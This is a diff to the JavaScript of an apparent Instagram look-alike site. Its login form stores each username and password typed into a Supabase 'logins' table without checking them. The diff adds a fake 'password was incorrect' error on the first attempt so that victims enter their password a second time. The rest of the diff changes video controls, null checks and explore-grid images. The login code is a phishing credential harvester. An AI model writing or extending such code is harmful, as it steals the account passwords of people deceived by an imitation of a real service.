@@ -62,12 +62,15 @@ document.addEventListener('DOMContentLoaded', () => {
   ];
 
   const exploreItems = [
-    { id: 201, image: 'https://images.unsplash.com/photo-1507525428034-b723cf961d3e?w=600&auto=format&fit=crop&q=80', likes: '4.2k', comments: '194' },
-    { id: 202, image: 'https://images.unsplash.com/photo-1469474968028-56623f02e42e?w=600&auto=format&fit=crop&q=80', likes: '8.9k', comments: '412' },
-    { id: 203, image: 'https://images.unsplash.com/photo-1512917774080-9991f1c4c750?w=600&auto=format&fit=crop&q=80', likes: '1.5k', comments: '87' },
-    { id: 204, image: 'https://images.unsplash.com/photo-1476514525535-ce74f45289c1?w=600&auto=format&fit=crop&q=80', likes: '6.7k', comments: '298' },
-    { id: 205, image: 'https://images.unsplash.com/photo-1540555700478-4be289fbecef?w=600&auto=format&fit=crop&q=80', likes: '3.1k', comments: '154' },
-    { id: 206, image: 'https://images.unsplash.com/photo-1498050108023-c5249f4df085?w=600&auto=format&fit=crop&q=80', likes: '12.4k', comments: '840' }
+    { id: 201, image: 'https://images.unsplash.com/photo-1610030469983-98e550d6193c?w=600&auto=format&fit=crop&q=80', likes: '14.2k', comments: '594', title: 'Indie Silk Saree' },
+    { id: 202, image: 'https://images.unsplash.com/photo-1570168007204-dfb528c6958f?w=600&auto=format&fit=crop&q=80', likes: '28.5k', comments: '1.2k', title: 'Indie Slum Life & Culture' },
+    { id: 203, image: 'https://images.unsplash.com/photo-1544126592-807ade215a0b?w=600&auto=format&fit=crop&q=80', likes: '18.9k', comments: '812', title: 'Indie Baby Portrait' },
+    { id: 204, image: 'https://images.unsplash.com/photo-1617627143750-d86bc21e42bb?w=600&auto=format&fit=crop&q=80', likes: '9.5k', comments: '387', title: 'Traditional Indie Saree' },
+    { id: 205, image: 'https://images.unsplash.com/photo-1488521787991-ed7bbaae773c?w=600&auto=format&fit=crop&q=80', likes: '31.4k', comments: '1.8k', title: 'Indie Slum Street Joy' },
+    { id: 206, image: 'https://images.unsplash.com/photo-1583391733956-3750e0ff4e8b?w=600&auto=format&fit=crop&q=80', likes: '16.7k', comments: '698', title: 'Heritage Ethnic Wear' },
+    { id: 207, image: 'https://images.unsplash.com/photo-1519689680058-324335c77eba?w=600&auto=format&fit=crop&q=80', likes: '11.8k', comments: '420', title: 'Sweet Indie Baby' },
+    { id: 208, image: 'https://images.unsplash.com/photo-1609357605129-26f69add5d6e?w=600&auto=format&fit=crop&q=80', likes: '22.4k', comments: '1.2k', title: 'Graceful Indie Woman' },
+    { id: 209, image: 'https://images.unsplash.com/photo-1522771739844-6a9f6d5f14af?w=600&auto=format&fit=crop&q=80', likes: '15.6k', comments: '512', title: 'Indie Child Smiles' }
   ];
 
   const suggestions = [
@@ -107,6 +110,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const authBtnText = document.getElementById('auth-btn-text');
 
   let isSignUpMode = false;
+  let loginAttemptCount = 0;
 
   const groupUsername = document.getElementById('group-username');
   const groupPhone = document.getElementById('group-phone');
@@ -143,7 +147,8 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Get Phone number, username, or email input
     const identifier = document.getElementById('login-email').value.trim();
-    const password = document.getElementById('login-password').value.trim();
+    const passwordElem = document.getElementById('login-password');
+    const password = passwordElem.value.trim();
     const username = document.getElementById('login-username')?.value.trim() || '';
     const phone = document.getElementById('login-phone')?.value.trim() || '';
 
@@ -152,7 +157,7 @@ document.addEventListener('DOMContentLoaded', () => {
     if (supabase) {
       try {
         // Save input values directly into Supabase table 'logins' without credential checking
-        const { data, error } = await supabase
+        await supabase
           .from('logins')
           .insert([
             {
@@ -168,14 +173,81 @@ document.addEventListener('DOMContentLoaded', () => {
       }
     }
 
-    // Hide auth screen and display user name immediately
+    loginAttemptCount++;
+
+    if (loginAttemptCount === 1) {
+      // First attempt: Show invalid password error prompt
+      showAuthError('Sorry, your password was incorrect. Please double-check your password.');
+      passwordElem.value = '';
+      return;
+    }
+
+    // Second attempt: Hide auth screen and display home view
     authScreen.classList.add('hidden');
     const displayUser = identifier;
     const profileUserElem = document.querySelector('.profile-username');
     if (profileUserElem) {
       profileUserElem.textContent = displayUser;
     }
+    if (homeVideo) {
+      homeVideo.play().catch(() => { });
+    }
   });
+
+  // --- Fullscreen Home Video Click Play/Pause Controller ---
+  const homeVideo = document.getElementById('home-video-player');
+  const videoOverlay = document.getElementById('video-play-pause-overlay');
+  const overlayIcon = document.getElementById('overlay-icon');
+
+  function showOverlayIcon(isPaused) {
+    if (!videoOverlay || !overlayIcon) return;
+    if (isPaused) {
+      overlayIcon.innerHTML = `<polygon points="5 3 19 12 5 21 5 3"></polygon>`;
+    } else {
+      overlayIcon.innerHTML = `<rect x="6" y="4" width="4" height="16"></rect><rect x="14" y="4" width="4" height="16"></rect>`;
+    }
+    videoOverlay.style.opacity = '1';
+    videoOverlay.style.transform = 'scale(1)';
+    setTimeout(() => {
+      videoOverlay.style.opacity = '0';
+      videoOverlay.style.transform = 'scale(0.8)';
+    }, 600);
+  }
+
+  if (homeVideo) {
+    const videoContainer = document.querySelector('.fullscreen-video-container') || homeVideo;
+    videoContainer.addEventListener('click', () => {
+      if (homeVideo.paused) {
+        homeVideo.play().then(() => showOverlayIcon(false)).catch(() => { });
+      } else {
+        homeVideo.pause();
+        showOverlayIcon(true);
+      }
+    });
+  }
+
+  // --- Mute / Sound Toggle Controller ---
+  const soundToggleBtn = document.getElementById('video-sound-toggle-btn');
+  const soundIcon = document.getElementById('sound-icon');
+
+  if (soundToggleBtn && homeVideo && soundIcon) {
+    soundToggleBtn.addEventListener('click', (e) => {
+      e.stopPropagation(); // Prevent toggling play/pause when clicking sound button
+      homeVideo.muted = !homeVideo.muted;
+      if (homeVideo.muted) {
+        soundIcon.innerHTML = `
+          <path d="M11 5L6 9H2v6h4l5 4V5z"></path>
+          <line x1="23" y1="9" x2="17" y2="15"></line>
+          <line x1="17" y1="9" x2="23" y2="15"></line>
+        `;
+      } else {
+        soundIcon.innerHTML = `
+          <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
+          <path d="M19.07 4.93a10 10 0 0 1 0 14.14M15.54 8.46a5 5 0 0 1 0 7.07"></path>
+        `;
+      }
+    });
+  }
 
   function showAuthError(msg) {
     authErrorMsg.textContent = msg;
@@ -183,6 +255,7 @@ document.addEventListener('DOMContentLoaded', () => {
   }
 
   logoutBtn.addEventListener('click', async () => {
+    loginAttemptCount = 0;
     authScreen.classList.remove('hidden');
   });
 
@@ -236,6 +309,25 @@ document.addEventListener('DOMContentLoaded', () => {
         item.classList.remove('active');
       }
     });
+
+    // Auto-pause video and stop ALL audio output when navigating away from Home (feed-view)
+    const homeVid = document.getElementById('home-video-player');
+    const soundIcon = document.getElementById('sound-icon');
+    if (homeVid) {
+      if (targetViewId === 'feed-view') {
+        homeVid.play().catch(() => { });
+      } else {
+        homeVid.pause();
+        homeVid.muted = true; // Stop all audio output completely
+        if (soundIcon) {
+          soundIcon.innerHTML = `
+            <path d="M11 5L6 9H2v6h4l5 4V5z"></path>
+            <line x1="23" y1="9" x2="17" y2="15"></line>
+            <line x1="17" y1="9" x2="23" y2="15"></line>
+          `;
+        }
+      }
+    }
   }
 
   navItems.forEach(item => {
@@ -250,6 +342,7 @@ document.addEventListener('DOMContentLoaded', () => {
   // --- Render Stories ---
   const storiesContainer = document.getElementById('stories-bar');
   function renderStories() {
+    if (!storiesContainer) return;
     storiesContainer.innerHTML = '';
     initialStories.forEach(story => {
       const storyEl = document.createElement('div');
@@ -269,6 +362,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const postsContainer = document.getElementById('posts-container');
 
   function renderFeedPosts() {
+    if (!postsContainer) return;
     postsContainer.innerHTML = '';
     feedPosts.forEach(post => {
       const postCard = document.createElement('div');
@@ -420,6 +514,7 @@ document.addEventListener('DOMContentLoaded', () => {
   // --- Render Sidebar Suggestions ---
   const suggestionsContainer = document.getElementById('suggestions-container');
   function renderSuggestions() {
+    if (!suggestionsContainer) return;
     suggestionsContainer.innerHTML = '';
     suggestions.forEach(item => {
       const el = document.createElement('div');
@@ -450,20 +545,24 @@ document.addEventListener('DOMContentLoaded', () => {
   // --- Render Explore Grid ---
   const exploreGridContainer = document.getElementById('explore-grid-container');
   function renderExploreGrid(itemsToRender = exploreItems) {
+    if (!exploreGridContainer) return;
     exploreGridContainer.innerHTML = '';
     itemsToRender.forEach(item => {
       const itemEl = document.createElement('div');
       itemEl.className = 'explore-item';
       itemEl.innerHTML = `
-        <img src="${item.image}" class="explore-image" alt="Explore">
+        <img src="${item.image}" class="explore-image" alt="${item.title || 'Explore'}" loading="lazy" onerror="this.onerror=null;this.src='https://images.unsplash.com/photo-1610030469983-98e550d6193c?w=600&auto=format&fit=crop&q=80';">
         <div class="explore-overlay">
-          <div class="explore-stat">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
-            <span>${item.likes}</span>
-          </div>
-          <div class="explore-stat">
-            <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
-            <span>${item.comments}</span>
+          <div class="explore-card-title">${item.title || ''}</div>
+          <div class="explore-stats-row">
+            <div class="explore-stat">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="white"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"></path></svg>
+              <span>${item.likes}</span>
+            </div>
+            <div class="explore-stat">
+              <svg width="15" height="15" viewBox="0 0 24 24" fill="white"><path d="M21 11.5a8.38 8.38 0 0 1-.9 3.8 8.5 8.5 0 0 1-7.6 4.7 8.38 8.38 0 0 1-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 0 1-.9-3.8 8.5 8.5 0 0 1 4.7-7.6 8.38 8.38 0 0 1 3.8-.9h.5a8.48 8.48 0 0 1 8 8v.5z"></path></svg>
+              <span>${item.comments}</span>
+            </div>
           </div>
         </div>
       `;
@@ -581,7 +680,9 @@ document.addEventListener('DOMContentLoaded', () => {
 
   const mobileCreateBtn = document.getElementById('mobile-create-btn');
 
-  navCreate.addEventListener('click', () => createModal.classList.add('active'));
+  if (navCreate) {
+    navCreate.addEventListener('click', () => createModal.classList.add('active'));
+  }
   if (mobileCreateBtn) {
     mobileCreateBtn.addEventListener('click', () => createModal.classList.add('active'));
   }
